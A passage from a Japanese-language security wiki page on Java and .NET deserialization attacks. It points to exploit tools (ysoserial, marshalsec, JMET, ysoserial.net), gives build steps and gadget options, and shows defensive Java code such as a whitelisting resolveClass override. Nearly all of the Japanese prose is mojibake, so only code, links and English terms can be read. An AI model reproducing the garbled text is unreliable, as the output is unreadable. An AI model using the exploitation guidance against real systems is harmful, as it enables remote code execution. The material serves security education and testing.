[**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) ã‚’ **ysoserial** ã¨ä¸€ç·’ã«ä½¿ã£ã¦ã€ã‚ˆã‚Šå¤šãã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€ãƒ„ãƒ¼ãƒ«ãŒç´¹ä»‹ã•ã‚ŒãŸ**ãƒˆãƒ¼ã‚¯ã®ã‚¹ãƒ©ã‚¤ãƒ‰**ã§ç¢ºèªã§ãã¾ã™: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) ã¯ã€Javaã®ç•°ãªã‚‹ **Json** ã¨ **Yml** ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚\
ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ãŸã‚ã«ã¯ã€`pom.xml` ã«ä»¥ä¸‹ã®**ä¾å­˜é–¢ä¿‚**ã‚’**è¿½åŠ **ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸï¼š
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**mavenã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—**ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’**ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ã—ã¾ã™ï¼š
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ã“ã®Java JSONãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã¤ã„ã¦ã‚‚ã£ã¨èª­ã‚€: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* ysoserialãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã—ãŸã„å ´åˆã¯ã€**ã“ã®webappã‚’å®Ÿè¡Œ**ã§ãã¾ã™: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ãªãœ

Javaã¯ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’è‡³ã‚‹æ‰€ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¥½ãã§ã™ã€‚ä¾‹ãˆã°:

* **HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆ** â€“ ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€ViewStateã€ã‚¯ãƒƒã‚­ãƒ¼ãªã©ã€‚
* **RMI** â€“ åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹Java RMIãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€100%ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚
* **HTTPä¸Šã®RMI** â€“ å¤šãã®Javaåšå®¢æˆ¸å‹webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ â€“ å†ã³100%ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã€‚
* **JMX** â€“ ã“ã¡ã‚‰ã‚‚ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒé€ä¿¡ã•ã‚Œã‚‹ã“ã¨ã«ä¾å­˜ã—ã¦ã„ã¾ã™ã€‚
* **ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒˆã‚³ãƒ«** â€“ ç”Ÿã®Javaã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®é€å—ä¿¡ã¯æ¨™æº–ã§ã‚ã‚Šã€ã“ã‚Œã‹ã‚‰è¦‹ã¦ã„ãã„ãã¤ã‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§ã‚ã‹ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

### äºˆé˜²

#### ä¸€æ™‚ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ

`Serializable`ã‚’å®Ÿè£…ã™ã‚‹ã‚¯ãƒ©ã‚¹ã¯ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå¯èƒ½ã§ã‚ã‚‹ã¹ãã§ã¯ãªã„ã‚¯ãƒ©ã‚¹å†…ã®ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’`transient`ã¨ã—ã¦å®Ÿè£…ã§ãã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializableã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‚¯ãƒ©ã‚¹ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’é¿ã‘ã‚‹

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸€éƒ¨ã¯ã€ãã®éšå±¤ã®ãŸã‚ã«`Serializable`ã‚’å®Ÿè£…ã™ã‚‹ã“ã¨ã‚’å¼·ã„ã‚‰ã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œãªã„ã‚ˆã†ã«ä¿è¨¼ã™ã‚‹ãŸã‚ã«ã¯ã€å¸¸ã«ä¾‹å¤–ã‚’æŠ•ã’ã‚‹`readObject()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®£è¨€ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ`final`ä¿®é£¾å­ä»˜ãã§ï¼‰ã€‚
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹å‰ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã‚¯ãƒ©ã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹

`java.io.ObjectInputStream` ã‚¯ãƒ©ã‚¹ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¯ãƒ©ã‚¹ã‚’ã‚µãƒ–ã‚¯ãƒ©ã‚¹åŒ–ã™ã‚‹ã“ã¨ã§ã€ãã®å‹•ä½œã‚’å¼·åŒ–ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä»¥ä¸‹ã®å ´åˆã«æœ€é©ãªè§£æ±ºç­–ã§ã™ï¼š

* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’è¡Œã†ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆ
* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’æœŸå¾…ã™ã‚‹ã‚¯ãƒ©ã‚¹ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆ

ä¸€èˆ¬çš„ãªè€ƒãˆæ–¹ã¯ã€[`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã¦ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’è¨±å¯ã™ã‚‹ã‚¯ãƒ©ã‚¹ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã§ã™ã€‚

ã“ã®å‘¼ã³å‡ºã—ã¯ `readObject()` ãŒå‘¼ã°ã‚Œã‚‹å‰ã«è¡Œã‚ã‚Œã‚‹ãŸã‚ã€è¨±å¯ã—ãŸã„å‹ã§ãªã„é™ã‚Šã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ´»å‹•ãŒç™ºç”Ÿã—ãªã„ã“ã¨ã‚’ç¢ºä¿¡ã§ãã¾ã™ã€‚

ã“ã“ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ç°¡å˜ãªä¾‹ã§ã¯ã€`LookAheadObjectInputStream` ã‚¯ãƒ©ã‚¹ã¯ `Bicycle` ã‚¯ãƒ©ã‚¹ä»¥å¤–ã®å‹ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ãªã„ã“ã¨ãŒä¿è¨¼ã•ã‚Œã¦ã„ã¾ã™ï¼š
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**java.io.ObjectInputStreamã®ä½¿ç”¨ã‚’ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã§å¼·åŒ–ã™ã‚‹**

ã‚³ãƒ¼ãƒ‰ã‚’æ‰€æœ‰ã—ã¦ã„ãªã„å ´åˆã‚„ãƒ‘ãƒƒãƒã‚’å¾…ã¤ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€`java.io.ObjectInputStream`ã«å¼·åŒ–ã‚’ç¹”ã‚Šè¾¼ã‚€ãŸã‚ã«ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã®ãŒæœ€å–„ã®è§£æ±ºç­–ã§ã™ã€‚\
ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã¦ã„ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½•ã‹ã‚ã‹ã‚‰ãªã„ãŸã‚ã€æ—¢çŸ¥ã®æ‚ªæ„ã®ã‚ã‚‹ã‚¿ã‚¤ãƒ—ã‚’ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«ç™»éŒ²ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã™ãŒã€ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã«ã¯ã§ãã¾ã›ã‚“ã€‚

ã“ã‚Œã‚‰ã®ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’æœ‰åŠ¹ã«ã™ã‚‹ã«ã¯ã€å˜ã«æ–°ã—ã„JVMãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è¿½åŠ ã—ã¾ã™:
```
-javaagent:name-of-agent.jar
```
ä¾‹ï¼š[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

### å‚è€ƒæ–‡çŒ®

* Deserializationã¨ysoserialã«é–¢ã™ã‚‹ãƒˆãƒ¼ã‚¯ï¼š[http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* gadgetinspectorã«é–¢ã™ã‚‹ãƒˆãƒ¼ã‚¯ï¼š[https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ã¨ã‚¹ãƒ©ã‚¤ãƒ‰ï¼š[https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsecè«–æ–‡ï¼š[https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaã¨.Netã®JSON deserialization **è«–æ–‡ï¼š** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ãƒˆãƒ¼ã‚¯ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ã¨ã‚¹ãƒ©ã‚¤ãƒ‰ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialziations CVEsï¼š[https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§**JNDI Injectionã¨ã¯ä½•ã‹ã€RMIã€CORBAã€LDAPã‚’ä»‹ã—ã¦ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã§ãã‚‹ã‹ã€log4shellã‚’ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã‹**ï¼ˆã“ã®è„†å¼±æ€§ã®ä¾‹ã‚‚å«ã‚€ï¼‰ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ï¼š

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service**ï¼ˆ**JMS**ï¼‰APIã¯ã€2ã¤ä»¥ä¸Šã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆé–“ã§ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®Javaãƒ¡ãƒƒã‚»ãƒ¼ã‚¸æŒ‡å‘ã®ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢APIã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ—ãƒ­ãƒ‡ãƒ¥ãƒ¼ã‚µãƒ¼ã¨ã‚³ãƒ³ã‚·ãƒ¥ãƒ¼ãƒãƒ¼ã®å•é¡Œã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã®å®Ÿè£…ã§ã™ã€‚JMSã¯Java Platform, Enterprise Editionï¼ˆJava EEï¼‰ã®ä¸€éƒ¨ã§ã‚ã‚Šã€Sun Microsystemsã§é–‹ç™ºã•ã‚ŒãŸä»•æ§˜ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã—ãŸãŒã€ç¾åœ¨ã¯Java Community Processã«ã‚ˆã£ã¦æŒ‡å°ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€Java EEã«åŸºã¥ãã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½œæˆã€é€ä¿¡ã€å—ä¿¡ã€ãŠã‚ˆã³èª­ã¿å–ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°æ¨™æº–ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€åˆ†æ•£ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ç•°ãªã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆé–“ã®é€šä¿¡ãŒã€ç–çµåˆã€ä¿¡é ¼æ€§ã€ãŠã‚ˆã³éåŒæœŸã§è¡Œã‚ã‚Œã¾ã™ã€‚ï¼ˆ[Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)ã‚ˆã‚Šï¼‰ã€‚

### è£½å“

ã“ã®ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã„ãã¤ã‹ã®è£½å“ãŒã‚ã‚Šã¾ã™ï¼š

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### æ‚ªç”¨

åŸºæœ¬çš„ã«ã¯ã€**å±é™ºãªæ–¹æ³•ã§JMSã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ãŒãŸãã•ã‚“ã‚ã‚Šã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®**ååˆ†ãªæ¨©é™**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆï¼ˆé€šå¸¸ã¯æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ãŒå¿…è¦ã§ã™ï¼‰ã€**æ¶ˆè²»è€…/ã‚µãƒ–ã‚¹ã‚¯ãƒ©ã‚¤ãƒãƒ¼ã«ã‚ˆã£ã¦é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã‚‹æ‚ªæ„ã®ã‚ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ«åŒ–ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã‚Œã¯ã€ã“ã®æ‚ªç”¨ã«ã‚ˆã‚Šã€ãã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒæ„ŸæŸ“ã™ã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã‚µãƒ¼ãƒ“ã‚¹ãŒè„†å¼±ã§ã‚ã‚‹ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’å®‰å…¨ã§ãªã„æ–¹æ³•ã§é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã—ã¦ã„ã‚‹ï¼‰å ´åˆã§ã‚‚ã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚’è¦šãˆã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ„ãƒ¼ãƒ«[JMET](https://github.com/matthiaskaiser/jmet)ã¯ã€**æ—¢çŸ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸè¤‡æ•°ã®æ‚ªæ„ã®ã‚ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’é€ä¿¡ã—ã€ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã—ã¦æ”»æ’ƒã™ã‚‹ãŸã‚ã«ä½œæˆã•ã‚Œã¾ã—ãŸ**ã€‚ã“ã‚Œã‚‰ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ãŒã¾ã è„†å¼±ã§ã‚ã‚Šã€ä½¿ç”¨ã•ã‚ŒãŸã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã„ãšã‚Œã‹ãŒè„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã«å­˜åœ¨ã™ã‚‹å ´åˆã«æ©Ÿèƒ½ã—ã¾ã™ã€‚

### å‚è€ƒæ–‡çŒ®

* JMETãƒˆãƒ¼ã‚¯ï¼š[https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* ã‚¹ãƒ©ã‚¤ãƒ‰ï¼š[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netã¯ã€deserializationã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®å‹•ä½œæ–¹æ³•ã«é–¢ã—ã¦Javaã¨ä¼¼ã¦ã„ã¾ã™ï¼š**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ**é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸã¨ãã«**èˆˆå‘³æ·±ã„**ã‚³ãƒ¼ãƒ‰ã‚’**å®Ÿè¡Œã™ã‚‹**ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’**æ‚ªç”¨ã—ã¾ã™**ã€‚

### ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒˆ

#### WhiteBox

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã§ä»¥ä¸‹ã®ç”¨èªã‚’æ¤œç´¢ã—ã¾ã™ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåˆ¶å¾¡å¯èƒ½ãªå¤‰æ•°ã«ã‚ˆã£ã¦å‹ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã‚’æ¢ã—ã¾ã™ã€‚

#### BlackBox

Base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—**AAEAAAD/////**ã‚„ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§**é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹**ä»–ã®ã‚‚ã®ã‚’æ¤œç´¢ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`TypeObject`ã‚„`$type`ã‚’å«ã‚€**JSON**ã‚„**XML**ãªã©ã§ã™ã€‚

### ysoserial.net

ã“ã®å ´åˆã€ãƒ„ãƒ¼ãƒ«[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦**é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆ**ã§ãã¾ã™ã€‚gitãƒªãƒã‚¸ãƒˆãƒªã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚‰ã€ä¾‹ãˆã°Visual Studioã‚’ä½¿ç”¨ã—ã¦ãƒ„ãƒ¼ãƒ«ã‚’**ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

**ysoserial.netãŒã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ã©ã®ã‚ˆã†ã«ä½œæˆã™ã‚‹ã‹**ã«ã¤ã„ã¦å­¦ã³ãŸã„å ´åˆã¯ã€[**ObjectDataProviderã‚¬ã‚¸ã‚§ãƒƒãƒˆ + ExpandedWrapper + Json.Netãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ã«ã¤ã„ã¦èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã“ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã§ãã¾ã™ã€‚

**ysoserial.net**ã®ä¸»ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ï¼š**`--gadget`**, **`--formatter`**, **`--output`** ãŠã‚ˆã³ **`--plugin`.**

* **`--gadget`** ã¯æ‚ªç”¨ã™ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼ˆé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ä¸­ã«ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚¯ãƒ©ã‚¹/é–¢æ•°ã‚’ç¤ºã—ã¾ã™ï¼‰ã€‚
* **`--formatter`** ã¯ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ«åŒ–ã™ã‚‹æ–¹æ³•ã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼ˆãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã€åŒã˜ã‚‚ã®ã‚’ã‚·ãƒªã‚¢ãƒ«åŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ï¼‰
